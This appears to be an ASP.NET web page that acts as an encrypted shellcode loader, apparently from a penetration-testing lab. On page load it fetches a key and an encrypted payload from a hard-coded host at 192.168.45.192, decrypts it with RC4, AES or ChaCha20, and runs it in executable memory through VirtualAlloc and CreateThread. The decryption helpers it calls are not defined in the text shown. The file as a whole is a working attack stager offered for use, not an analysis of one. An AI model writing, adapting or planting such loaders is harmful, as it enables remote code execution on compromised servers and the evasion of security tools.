<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Reflection" %>


<script runat="server">

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
    
    [DllImport("kernel32")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private void ExecuteShellcode(byte[] shellcode)
    {
        // Allocate memory for shellcode
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE

        // Copy shellcode to allocated memory
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // Create a new thread to execute the shellcode
        uint threadId = 0;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, ref threadId);

        // Wait for the thread to finish
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        string keyUrl = "http://192.168.45.192:8000/key.txt";
        string shellcodeUrl = "http://192.168.45.192:8000/file.txt";

        // Download key and shellcode
        string[] keyFile = Encoding.UTF8.GetString(DownloadFile(keyUrl)).Split('\n');
        byte[] encryptedShellcode = DownloadFile(shellcodeUrl);

        string encryptionType = keyFile[0].Trim();
        byte[] key = Convert.FromBase64String(keyFile[1].Trim());

        byte[] decryptedShellcode = null;

        // Decrypt based on type
        if (encryptionType == "RC4")
        {
            decryptedShellcode = RC4Decrypt(key, encryptedShellcode);
        }
        else if (encryptionType == "AES")
        {
            decryptedShellcode = AESDecrypt(key, encryptedShellcode);
        }
        else if (encryptionType == "ChaCha20")
        {
            decryptedShellcode = ChaCha20Decrypt(key, encryptedShellcode);
        }

        // Execute the shellcode
        if (decryptedShellcode != null)
        {
            ExecuteShellcode(decryptedShellcode);
        }
    }
</script>
